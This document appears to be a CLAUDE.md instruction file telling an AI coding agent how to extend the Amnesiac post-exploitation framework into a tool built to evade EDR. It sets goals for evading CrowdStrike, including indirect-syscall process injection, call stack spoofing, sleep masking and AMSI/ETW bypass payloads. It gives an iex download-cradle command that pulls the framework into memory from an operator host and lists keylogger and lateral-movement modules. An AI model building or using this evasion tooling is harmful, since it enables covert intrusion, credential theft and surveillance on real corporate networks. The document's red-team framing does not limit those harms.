# Amnesiac — Red Team Edition

## Project Objective

Extend the [Amnesiac](https://github.com/Leo4j/Amnesiac) post-exploitation framework into a red-team-grade tool that:

1. Operates with **zero disk writes** on targets by default
2. Evades **CrowdStrike Falcon** behavioral detection through in-memory .NET assembly loading, indirect syscalls, call stack spoofing, and sleep masking
3. Works from both **non-domain-joined** and **domain-joined** operator machines on an internal network
4. Delivers all tool modules **over the named pipe channel** — no GitHub downloads from targets

All existing Amnesiac functionality (sessions, commands, tool modules) remains fully operational.

---

## Operational Scenarios

### Scenario 1 — Non-Domain-Joined Operator (Red Team External)
Operator machine is **not joined to the target domain**. Operator has full local admin on their own machine and domain credentials for the target environment. Loading method is not a concern — operator can disable Defender on their own machine as needed.

Launch from a domain-credentialed session:

```powershell
runas /netonly /user:DOMAIN\username powershell.exe
# In the new PS window:
. .\Amnesiac.ps1; Amnesiac -Detached -IP <operator-IP>
```

Set engagement profile:
```
engagement nondomained
```

Amnesiac detects the network logon token (`runas /netonly` creates a Type-9 NewCredentials logon) and confirms domain credential availability.

**Key characteristics:**
- Operator machine is NOT monitored — no loading constraints, Defender can be disabled
- Full local admin — can run `serve`, write files, start listeners
- `diskmode` defaults OFF (protects targets); operator can enable it on their own machine safely
- All target-side operations remain in-memory

### Scenario 2 — Low-Privilege Assumed Breach (Domain-Joined, EDR-Protected)
Operator has obtained a **low-privilege shell on a domain-joined machine** running Windows Defender and a corporate EDR (e.g., CrowdStrike Falcon). The operator runs Amnesiac on THIS compromised machine to enumerate, exploit, and move laterally.

**Loading approach — iex in-memory bootstrap:**

AMSI scans scripts at download time, so a one-liner AMSI bypass must run first in the current PS process, then Amnesiac is pulled entirely into memory via `iex` — nothing written to disk.

```powershell
# Step 1: AMSI bypass one-liner (any working technique for the target environment)
# <amsi-bypass-one-liner>

# Step 2a: load from operator HTTP server (preferred — no outbound GitHub from target network)
iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1'); Amnesiac

# Step 2b: load from GitHub if operator server not available
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac
```

Once loaded into memory, all existing stealth features handle the rest — bypasses active in every generated payload, all tool delivery over the named pipe, no disk writes.

Set engagement profile:
```
engagement domained
```

**Key characteristics:**
- AMSI bypass must run BEFORE the `iex` — the script is scanned on download
- Use `Amnesiac_ShellReady.ps1` (no ANSI colour codes — cleaner for constrained shell environments)
- `diskmode` MUST remain OFF — any disk write may be scanned
- Low-privilege: `serve` cannot write files to disk (diskmode off blocks it); use operator HTTP server to host tools pre-loaded from `Tools\`
- The operator HTTP server (`serve`) should also host `Amnesiac_ShellReady.ps1` so Scenario 2 machines pull from it rather than GitHub

---

## Architecture

See full design spec: `docs/superpowers/specs/2026-05-23-amnesiac-stealth-overhaul-design.md`

Four improvement layers, all changes in `Amnesiac.ps1`:

| Layer | What it does |
|-------|-------------|
| **Layer 1** | Disk elimination — no writes on operator or target by default |
| **Layer 2** | Payload generation — stealth format extensions, AmnesiacLoader C# assembly, AES pipe encryption |
| **Layer 3** | In-memory tool delivery — replaces GitHub downloads with in-pipe streaming |
| **Layer 4** | Operational guardrails — engagement profiles, runas/netonly detection, environment keying |

---

## Key Commands (New)

| Command | Description |
|---------|-------------|
| `diskmode [on\|off]` | Toggle disk writes (default: off) |
| `engagement [nondomained\|domained\|reset]` | Set operational profile |
| `launcher` | Cycle execution vector (ps → wmi → schtask → com) |
| `psk <passphrase>` | Set AES pre-shared key for pipe channel |
| `key hostname\|domain\|user <value>` | Set payload environment key |
| `key clear` | Remove all environment keys |
| `modules` | List tool cache status |
| `modules reload` | Refresh tool cache from Tools\ |
| `artifacts` | List in-memory captured artifacts |
| `save <type>` | Write artifact to operator disk |

## Listener UX

When the operator selects **single listener** or **global listener** from the main menu, `Show-PayloadMenu` runs first and presents a numbered format picker:

```
  [1] b64     — base64 encoded one-liner (most compatible)
  [2] gzip    — gzip+base64 compressed, shorter footprint
  [3] stealth — gzip+obfuscated, includes AMSI/ETW/SBL bypasses
  [4] raw     — inline PowerShell, no encoding
  [5] pwsh    — Start-Process launcher, spawns hidden PS process
```

**Single listener behaviour:**
- Waits indefinitely (no timeout) using `WaitForConnectionAsync` + 150ms poll loop
- Press `Q` to cancel — a self-connecting dummy pipe unblocks the server cleanly
- On callback: automatically enters `InteractWithPipeSession` (no extra menu step)

**Global listener behaviour:**
- Polls `Scan-WaitingTargets` every 500ms after displaying the payload
- Prints arriving sessions in green as they connect: `[+] Session received: HOST [user]`
- Press `Q` to stop; reports total new sessions collected

---

## AmnesiacLoader — C# Assembly

Located in `AmnesiacLoader/`. Provides:
- Indirect syscall process injection (EAT-walking SSN resolution)
- Call stack frame spoofing
- Sleep masking (AES encrypt memory during dormancy)

### Build Requirements
- .NET SDK 6.0+ (for build tooling)
- Target framework: net462 (runs on any Windows with .NET 4.6.2+)

### Build & Embed
```powershell
cd AmnesiacLoader
.\Build.ps1
# This compiles AmnesiacLoader.dll, base64-encodes it,
# and updates $AmnesiacLoaderB64 in Amnesiac.ps1 automatically
```

### Pre-built
A pre-built base64 blob is included in `Amnesiac.ps1` as `$AmnesiacLoaderB64`.
Run `Build.ps1` only if you modify the C# source.

---

## Tool Delivery

Tools reach targets via the named pipe channel exclusively — no network calls from targets.

### Operator-Side Tool Cache (pre-session)

`Initialize-ToolCache` populates `$global:ToolCache` at startup in priority order:

| Priority | Source | How |
|----------|--------|-----|
| 1 | Embedded gzip+base64 in Amnesiac.ps1 | Always available: SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess |
| 2 | `Tools\` directory | Loaded at startup; `modules reload` refreshes |
| 3 | Operator local HTTP server | Run `serve` to start; loads heavy modules (Suntour, Ferrari, ppl, RDPKeylog.exe) |
| 4 | GitHub (fallback) | `https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools` — used only if tool not found in tiers 1–3 |

**The intended fallback chain:** Operator HTTP server first → GitHub only if server not running.

**⚠️ KNOWN GAP — Fallback chain not fully wired:**
Currently `Initialize-ToolCache` only loads tiers 1 and 2. The `serve` command downloads tools from GitHub to disk (requires `diskmode on`) then starts the HTTP server — but tools from the HTTP server are NOT automatically loaded into `$global:ToolCache`. `Send-Module` fails if the tool is not in cache; it does not auto-fetch from the HTTP server or GitHub.

The intended behavior (not yet implemented):
- `serve` should load `Tools\` into memory and start the HTTP server from that, no GitHub download
- If a tool is missing from cache, check operator HTTP server, then GitHub (operator-side fetch only)
- Target never makes any network call for tools

### Target-Side Delivery (in-session)

`Send-Module <toolname>` streams from `$global:ToolCache` over the named pipe:
1. `__MODULE_BEGIN__:<name>:<length>`
2. `__MODULE_CHUNK__:<base64-4KB>` (repeated)
3. `__MODULE_END__:<name>`

Target assembles chunks and executes via `[scriptblock]::Create($source).Invoke()`.
Binary modules (.exe/.dll): base64-decode → `[Reflection.Assembly]::Load()`.

---

## OPSEC Checklist (Pre-Engagement)

- [ ] Launch from `runas /netonly` session (Scenario 1) or domain-joined machine (Scenario 2)
- [ ] Set `engagement nondomained` or `engagement domained`
- [ ] Verify `diskmode` is OFF (default)
- [ ] Confirm tool cache loaded: run `modules`
- [ ] Run `serve` if heavy modules needed
- [ ] Set `psk <passphrase>` for AES pipe encryption
- [ ] Set `key hostname <target>` before generating payloads (optional but recommended)
- [ ] Review startup OPSEC summary banner

---

## File Structure

```
Amnesiac-main/
├── Amnesiac.ps1                    — main framework (all modifications here)
├── Amnesiac_ShellReady.ps1         — shell-compatible version (no colours)
├── Tools/                          — tool modules (Standard tier)
│   ├── SimpleAMSI.ps1
│   ├── NETAMSI.ps1
│   ├── ... (23 tools)
│   └── RDPKeylog.exe
├── AmnesiacLoader/                 — C# assembly project
│   ├── Loader.cs
│   ├── CallStack.cs
│   ├── SleepMask.cs
│   ├── AmnesiacLoader.csproj
│   └── Build.ps1
├── docs/
│   └── superpowers/specs/
│       └── 2026-05-23-amnesiac-stealth-overhaul-design.md
├── CLAUDE.md                       — this file
├── CHANGELOG.md                    — change history
└── README.md                       — original Amnesiac readme
```

---

## Known Gaps (Not Yet Implemented)

| Gap | Impact | Description |
|-----|--------|-------------|
| **Tool cache fallback chain** | Medium | `Send-Module` fails if tool not in cache — no auto-fetch from operator HTTP server or GitHub. Tiers 3 and 4 in the load chain are documented but not wired in code. |
| **`serve` diskmode conflict** | RESOLVED (Plan 5) | `serve` now roots `SimpleFileServer` at `$global:AmnesiacRoot` (project root), serving `Tools\` and `Amnesiac_ShellReady.ps1` directly — no GitHub download, no disk write. |

---

## Contribution Notes

- All changes target `Amnesiac.ps1` only unless adding new source files
- Test each layer independently before combining
- Run against GOAD lab with CrowdStrike enabled to validate evasion
- Document every change in `CHANGELOG.md` with the operational context for the change
- The `stealth` payload is built at generation time (when the operator selects it from `Show-PayloadMenu`) — it embeds the current session's `$global:EndMarker` and `$global:BufferSize`. If the protocol changes mid-session, re-invoke the listener to regenerate the stealth payload
